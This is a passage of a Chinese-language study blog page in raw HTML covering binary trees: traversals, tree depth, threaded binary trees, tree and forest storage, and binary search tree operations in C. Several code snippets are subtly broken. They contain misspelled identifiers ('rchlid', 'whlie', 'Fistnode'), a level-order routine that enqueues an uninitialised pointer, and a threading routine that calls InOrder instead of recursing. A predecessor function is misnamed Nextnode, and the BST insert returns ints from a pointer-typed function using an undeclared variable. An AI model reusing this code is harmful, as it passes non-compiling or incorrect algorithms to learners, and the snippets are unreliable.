class="hljs-class">&#123;</span><br>    ElemType data;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">BiTNode</span> *<span class="hljs-title">lchild</span>,*<span class="hljs-title">rchild</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">BiTNode</span> *<span class="hljs-title">parent</span>;</span><br>&#125;BiTNode,*BiTree;<br></code></pre></td></tr></table></figure><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%83/24.jpg" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="11-二叉树的遍历"><a href="#11-二叉树的遍历" class="headerlink" title="11.二叉树的遍历"></a>11.二叉树的遍历</h4><ul><li><h6 id="什么是遍历"><a href="#什么是遍历" class="headerlink" title="什么是遍历"></a>什么是遍历</h6></li></ul><p>&emsp;&emsp;按照某种次序把所有的结点都访问一遍</p><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%83/25.jpg" style="zoom:80%;" /></center><ul><li><h6 id="三种遍历（前、中、后）"><a href="#三种遍历（前、中、后）" class="headerlink" title="三种遍历（前、中、后）"></a>三种遍历（前、中、后）</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%83/26.jpg" style="zoom:80%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%83/27.jpg" style="zoom:80%;" /></center><ul><li><h6 id="遍历代码"><a href="#遍历代码" class="headerlink" title="遍历代码"></a>遍历代码</h6></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//先序遍历</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">PreOrder</span><span class="hljs-params">(BiTree T)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(T!=<span class="hljs-literal">NULL</span>)<br>    &#123;<br>        visit(T);             <span class="hljs-comment">//访问根节点</span><br>        PreOrder(T-&gt;lchild);  <span class="hljs-comment">//递归遍历左子树</span><br>        PreOrder(T-&gt;rchild);  <span class="hljs-comment">//递归遍历右子树</span><br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//中序遍历</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">InOrder</span><span class="hljs-params">(BiTree T)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(T!=<span class="hljs-literal">NULL</span>)<br>    &#123;<br>        InOrder(T-&gt;lchild);  <span class="hljs-comment">//递归遍历左子树</span><br>        visit(T);             <span class="hljs-comment">//访问根节点</span><br>        InOrder(T-&gt;rchild);  <span class="hljs-comment">//递归遍历右子树</span><br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//后序遍历</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">PostOrder</span><span class="hljs-params">(BiTree T)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(T!=<span class="hljs-literal">NULL</span>)<br>    &#123;<br>        PostOrder(T-&gt;lchild);  <span class="hljs-comment">//递归遍历左子树</span><br>        PostOrder(T-&gt;rchild);  <span class="hljs-comment">//递归遍历右子树        </span><br>        visit(T);             <span class="hljs-comment">//访问根节点</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><h6 id="求树的深度"><a href="#求树的深度" class="headerlink" title="求树的深度"></a>求树的深度</h6></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">treeDepth</span><span class="hljs-params">(BiTree T)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(T == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-type">int</span> l = treeDepth(T-&gt;lchild);<br>        <span class="hljs-type">int</span> r = treeDepth(T-&gt;rchlid);<br>        <span class="hljs-keyword">return</span> l&gt;r ? l+<span class="hljs-number">1</span> : r+<span class="hljs-number">1</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><h6 id="层序遍历"><a href="#层序遍历" class="headerlink" title="层序遍历"></a>层序遍历</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%83/28.jpg" style="zoom:80%;" /></center><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">LevelOrder</span><span class="hljs-params">(BiTREE T)</span><br>&#123;<br>    LinkQueue Q;<br>    InitQueue(Q);<br>    BiTree p;<br>    EnQueue(Q,p);<br>    whlie(!IsEmpty(Q))<br>    &#123;<br>        DeQueue(Q,p);<br>        visit(p);<br>        <span class="hljs-keyword">if</span>(p-&gt;lchild!=<span class="hljs-literal">NULL</span>)<br>            EnQueue(Q,p-&gt;lchild);<br>        <span class="hljs-keyword">if</span>(p-&gt;rchild!=<span class="hljs-literal">NULL</span>)<br>            EnQueue(Q,p-&gt;rchild);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>&emsp;</p><h4 id="12-遍历序列构造二叉树"><a href="#12-遍历序列构造二叉树" class="headerlink" title="12.遍历序列构造二叉树"></a>12.遍历序列构造二叉树</h4><ul><li><h6 id="前序-中序"><a href="#前序-中序" class="headerlink" title="前序+中序"></a>前序+中序</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%83/29.jpg" style="zoom:80%;" /></center><ul><li><h6 id="后序-中序"><a href="#后序-中序" class="headerlink" title="后序+中序"></a>后序+中序</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%83/31.jpg" style="zoom:80%;" /></center><ul><li><h6 id="层序-中序"><a href="#层序-中序" class="headerlink" title="层序+中序"></a>层序+中序</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%83/32.jpg" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="13-线索二叉树"><a href="#13-线索二叉树" class="headerlink" title="13.线索二叉树"></a>13.线索二叉树</h4><ul><li><h6 id="中序线索二叉树"><a href="#中序线索二叉树" class="headerlink" title="中序线索二叉树"></a>中序线索二叉树</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%83/33.jpg" style="zoom:80%;" /></center><ul><li><h6 id="线索二叉树的存储结构"><a href="#线索二叉树的存储结构" class="headerlink" title="线索二叉树的存储结构"></a>线索二叉树的存储结构</h6></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//线索二叉树结点</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ThreadNode</span></span><br><span class="hljs-class">&#123;</span><br>    ElemType data;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ThreadNode</span> *<span class="hljs-title">lchild</span>,*<span class="hljs-title">rchild</span>;</span><br>    <span class="hljs-type">int</span> ltag,rtag;<br>&#125;ThreadNode,*ThreadTree;<br></code></pre></td></tr></table></figure><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%83/34.jpg" style="zoom:80%;" /></center><ul><li><h6 id="三种线索二叉树对比"><a href="#三种线索二叉树对比" class="headerlink" title="三种线索二叉树对比"></a>三种线索二叉树对比</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%83/35.jpg" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="14-二叉树的线索化实现"><a href="#14-二叉树的线索化实现" class="headerlink" title="14.二叉树的线索化实现"></a>14.二叉树的线索化实现</h4><ul><li><h6 id="中序线索化"><a href="#中序线索化" class="headerlink" title="中序线索化"></a>中序线索化</h6></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//土方法找中序前驱</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">InThread</span><span class="hljs-params">(BiTree T)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(T!=<span class="hljs-literal">NULL</span>)<br>    &#123;<br>        InOrder(T-&gt;lchild);  <span class="hljs-comment">//递归遍历左子树</span><br>        visit(T);             <span class="hljs-comment">//访问根节点</span><br>        InOrder(T-&gt;rchild);  <span class="hljs-comment">//递归遍历右子树</span><br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//访问结点q</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">visit</span><span class="hljs-params">(BiTNode *q)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (q==p)          <span class="hljs-comment">//当前访问结点刚好是结点p        </span><br>        final = pre;   <span class="hljs-comment">//找到p的前驱</span><br>    <span class="hljs-keyword">else</span><br>        pre = q;      <span class="hljs-comment">//pre指向当前访问的结点</span><br>&#125;<br><br><span class="hljs-comment">//辅助全局变量，用于查找结点判断前驱</span><br>BiTNode *p;       <span class="hljs-comment">//p指向目标结点</span><br>BiTNode * pre=<span class="hljs-literal">NULL</span>;    <span class="hljs-comment">// 指向当前访问结点的前驱</span><br>BiTNode * final=<span class="hljs-literal">NULL</span>;  <span class="hljs-comment">//用于记录最终结果</span><br></code></pre></td></tr></table></figure><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%83/36.jpg" style="zoom:80%;" /></center><p>&emsp;</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//中序线索化</span><br><span class="hljs-comment">//辅助全局变量，用于查找结点判断前驱</span><br>BiTNode * pre=<span class="hljs-literal">NULL</span>;    <span class="hljs-comment">// 指向当前访问结点的前驱</span><br><br><span class="hljs-comment">//中序线索化二叉树T</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">CreateInThread</span><span class="hljs-params">(ThreadTree T)</span><br>&#123;<br>    pre=<span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">if</span>(T!=<span class="hljs-literal">NULL</span>)<br>    &#123;<br>        InThread(T);<br>        <span class="hljs-keyword">if</span>(pre-&gt;rchild==<span class="hljs-literal">NULL</span>)<br>            pre-&gt;rtag=<span class="hljs-number">1</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//线索二叉树结点</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ThreadNode</span>   </span><br><span class="hljs-class">&#123;</span><br>    ElemType data;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ThreadNode</span> *<span class="hljs-title">lchild</span>,*<span class="hljs-title">rchild</span>;</span><br>    <span class="hljs-type">int</span> ltag,rtag;<br>&#125;ThreadNode,*ThreadTree;<br><br><span class="hljs-comment">//中序遍历二叉树</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">InThread</span><span class="hljs-params">(BiTree T)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(T!=<span class="hljs-literal">NULL</span>)<br>    &#123;<br>        InOrder(T-&gt;lchild);  <span class="hljs-comment">//递归遍历左子树</span><br>        visit(T);             <span class="hljs-comment">//访问根节点</span><br>        InOrder(T-&gt;rchild);  <span class="hljs-comment">//递归遍历右子树</span><br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">visit</span><span class="hljs-params">(ThreadNode *q)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(q-&gt;lchild==<span class="hljs-literal">NULL</span>)   <span class="hljs-comment">//左子树为空，建立前驱线索</span><br>    &#123;<br>        q-&gt;lchild=pre;<br>        q-&gt;ltag=<span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(pre!=<span class="hljs-literal">NULL</span>&amp;&amp;pre-&gt;rchild==<span class="hljs-literal">NULL</span>)<br>    &#123;<br>        pre-&gt;rchild=q;<br>        pre-&gt;rtag=<span class="hljs-number">1</span>;<br>    &#125;<br>    pre=q;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><h6 id="先序线索化"><a href="#先序线索化" class="headerlink" title="先序线索化"></a>先序线索化</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%83/37.jpg" style="zoom:80%;" /></center><ul><li><h6 id="后序线索化"><a href="#后序线索化" class="headerlink" title="后序线索化"></a>后序线索化</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%83/38.jpg" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="15-线索二叉树找前驱-后继"><a href="#15-线索二叉树找前驱-后继" class="headerlink" title="15.线索二叉树找前驱/后继"></a>15.线索二叉树找前驱/后继</h4><ul><li><h6 id="中序线索二叉树查找中序后继"><a href="#中序线索二叉树查找中序后继" class="headerlink" title="中序线索二叉树查找中序后继"></a>中序线索二叉树查找中序后继</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%83/39.jpg" style="zoom:50%;" /></center><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//找到以p为根的子树中，第一个被中序遍历的结点</span><br>ThreadNode *<span class="hljs-title function_">Firstnode</span><span class="hljs-params">(ThreadNode *p)</span><br>&#123;<br>    <span class="hljs-comment">//循环找到最左下结点</span><br>    <span class="hljs-keyword">while</span>(p-&gt;ltag==<span class="hljs-number">0</span>)<br>        p=p-&gt;lchild;<br>    <span class="hljs-keyword">return</span> p;<br>&#125;<br><span class="hljs-comment">//在中序线索二叉树中找到结点p的后继结点</span><br>ThreadNode *<span class="hljs-title function_">Nextnode</span><span class="hljs-params">(ThreadNode *p)</span><br>&#123;<br>    <span class="hljs-comment">//右子树最左下结点</span><br>    <span class="hljs-keyword">if</span>(p-&gt;rtag==<span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span> Fistnode(p-&gt;rchild);<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">return</span> p-&gt;rchild;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><h6 id="中序线索二叉树查找中序前驱"><a href="#中序线索二叉树查找中序前驱" class="headerlink" title="中序线索二叉树查找中序前驱"></a>中序线索二叉树查找中序前驱</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%83/40.jpg" style="zoom:50%;" /></center><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//找到以p为根的子树中，最后一个被中序遍历的结点</span><br>ThreadNode *<span class="hljs-title function_">Lastnode</span><span class="hljs-params">(ThreadNode *p)</span><br>&#123;<br>    <span class="hljs-comment">//循环找到最左下结点</span><br>    <span class="hljs-keyword">while</span>(p-&gt;rtag==<span class="hljs-number">0</span>)<br>        p=p-&gt;rchild;<br>    <span class="hljs-keyword">return</span> p;<br>&#125;<br><span class="hljs-comment">//在中序线索二叉树中找到结点p的后继结点</span><br>ThreadNode *<span class="hljs-title function_">Nextnode</span><span class="hljs-params">(ThreadNode *p)</span><br>&#123;<br>    <span class="hljs-comment">//右子树最左下结点</span><br>    <span class="hljs-keyword">if</span>(p-&gt;rtag==<span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span> Lastnode(p-&gt;lchild);<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">return</span> p-&gt;lchild;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><h6 id="先序线索二叉树查找先序后继"><a href="#先序线索二叉树查找先序后继" class="headerlink" title="先序线索二叉树查找先序后继"></a>先序线索二叉树查找先序后继</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%83/41.jpg" style="zoom:80%;" /></center><ul><li><h6 id="先序线索二叉树查找先序前驱"><a href="#先序线索二叉树查找先序前驱" class="headerlink" title="先序线索二叉树查找先序前驱"></a>先序线索二叉树查找先序前驱</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%83/42.jpg" style="zoom:80%;" /></center><ul><li><h6 id="后序线索二叉树查找后序后继"><a href="#后序线索二叉树查找后序后继" class="headerlink" title="后序线索二叉树查找后序后继"></a>后序线索二叉树查找后序后继</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%83/43.jpg" style="zoom:80%;" /></center><ul><li><h6 id="后序线索二叉树查找后序前驱"><a href="#后序线索二叉树查找后序前驱" class="headerlink" title="后序线索二叉树查找后序前驱"></a>后序线索二叉树查找后序前驱</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%83/44.jpg" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="16-树的存储结构"><a href="#16-树的存储结构" class="headerlink" title="16.树的存储结构"></a>16.树的存储结构</h4><ul><li><h6 id="双亲表示法（顺序存储）"><a href="#双亲表示法（顺序存储）" class="headerlink" title="双亲表示法（顺序存储）"></a>双亲表示法（顺序存储）</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%83/45.jpg" style="zoom:80%;" /></center><ul><li><h6 id="孩子表示法（顺序-链式存储）"><a href="#孩子表示法（顺序-链式存储）" class="headerlink" title="孩子表示法（顺序+链式存储）"></a>孩子表示法（顺序+链式存储）</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%83/46.jpg" style="zoom:80%;" /></center><ul><li><h6 id="孩子兄弟表示法（链式存储）"><a href="#孩子兄弟表示法（链式存储）" class="headerlink" title="孩子兄弟表示法（链式存储）"></a>孩子兄弟表示法（链式存储）</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%83/47.jpg" style="zoom:80%;" /></center><ul><li><h6 id="转化问题"><a href="#转化问题" class="headerlink" title="转化问题"></a>转化问题</h6></li></ul><p>&emsp;</p><h4 id="17-树的遍历"><a href="#17-树的遍历" class="headerlink" title="17.树的遍历"></a>17.树的遍历</h4><ul><li><h6 id="先根遍历"><a href="#先根遍历" class="headerlink" title="先根遍历"></a>先根遍历</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%83/48.jpg" style="zoom:80%;" /></center><ul><li><h6 id="后根遍历"><a href="#后根遍历" class="headerlink" title="后根遍历"></a>后根遍历</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%83/49.jpg" style="zoom:80%;" /></center><ul><li>层次遍历</li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%83/50.jpg" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="18-森林的遍历"><a href="#18-森林的遍历" class="headerlink" title="18.森林的遍历"></a>18.森林的遍历</h4><ul><li><h6 id="先序遍历"><a href="#先序遍历" class="headerlink" title="先序遍历"></a>先序遍历</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%83/51.jpg" style="zoom:80%;" /></center><ul><li><h6 id="中序遍历"><a href="#中序遍历" class="headerlink" title="中序遍历"></a>中序遍历</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%83/52.jpg" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="19-二叉排序树"><a href="#19-二叉排序树" class="headerlink" title="19.二叉排序树"></a>19.二叉排序树</h4><p>&emsp;&emsp;&emsp;二叉排序数，又称二叉查找树（BST），一棵二叉树或者空二叉树，或者是具有如下性质的二叉树；</p><p>&emsp;&emsp;左子树上所有结点的关键字均小于根节点的关键字；</p><p>&emsp;&emsp;右子树上所有结点的关键字均大于根节点的关键字。</p><p>&emsp;&emsp;左子树和右子树由各是一棵二叉排序树。</p><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%83/53.jpg" style="zoom:80%;" /></center><ul><li><h6 id="二叉排序树的查找"><a href="#二叉排序树的查找" class="headerlink" title="二叉排序树的查找"></a>二叉排序树的查找</h6></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//正常实现思路</span><br>BSTNode *<span class="hljs-title function_">BST_Search</span><span class="hljs-params">(BSTree T,<span class="hljs-type">int</span> key)</span><br>&#123;<br>    <span class="hljs-keyword">while</span>(T!=<span class="hljs-literal">NULL</span>&amp;&amp;key!=T-&gt;key)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(key&lt;T-&gt;key)<br>            T=T-&gt;lchild;<br>        <span class="hljs-keyword">else</span><br>            T=T-&gt;rchild;<br>    &#125;<br>    <span class="hljs-keyword">return</span> T;<br>&#125;<br><br><span class="hljs-comment">//递归实现思路</span><br>BSTNode *<span class="hljs-title function_">BSTSearch</span><span class="hljs-params">(BSTree T,<span class="hljs-type">int</span> key)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(T==<span class="hljs-literal">NULL</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">if</span>(key==T-&gt;key)<br>        <span class="hljs-keyword">return</span> T;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(key &lt; T-&gt;key)<br>        <span class="hljs-keyword">return</span> BSTSearch(T-&gt;lchild,key);<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">return</span> BSTSearch(T-&gt;rchild,key);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><h6 id="二叉排序树的插入"><a href="#二叉排序树的插入" class="headerlink" title="二叉排序树的插入"></a>二叉排序树的插入</h6></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//递归实现思路</span><br>BSTNode *<span class="hljs-title function_">BST_Insert</span><span class="hljs-params">(BSTree &amp;T,<span class="hljs-type">int</span> key)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(T==<span class="hljs-literal">NULL</span>)<br>    &#123;<br>        T=(BSTree)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(BSTNode));<br>        T-&gt;key=k;<br>        T-&gt;lchild=T-&gt;rchild=<span class="hljs-literal">NULL</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(key==T-&gt;key)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(key &lt; T-&gt;key)<br>        <span class="hljs-keyword">return</span> BST_Insert(T-&gt;lchild,key);<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">return</span> BST_Insert(T-&gt;rchild,key);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><h6 id="二叉排序树的构造"><a href="#二叉排序树的构造" class="headerlink" title="二叉排序树的构造"></a>二叉排序树的构造</h6></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">Creat_BST</span><span class="hljs-params">(BSTree &amp;T,<span class="hljs-type">int</span> str[],<span class="hljs-type">int</span> n)</span><br>&#123;<br>    T=<span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span>(i&lt;n)<br>    &#123;<br>        BST_Insert(T,str[i]);<br>        i++;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%83/54.jpg" style="zoom:80%;" /></center><ul><li><h6 id="二叉排序树的删除"><a href="#二叉排序树的删除" class="headerlink" title="二叉排序树的删除"></a>二叉排序树的删除</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%83/55.jpg" style="zoom:80%;" /></center><ul><li><h6 id="查找效率计算"><a href="#查找效率计算" class="headerlink" 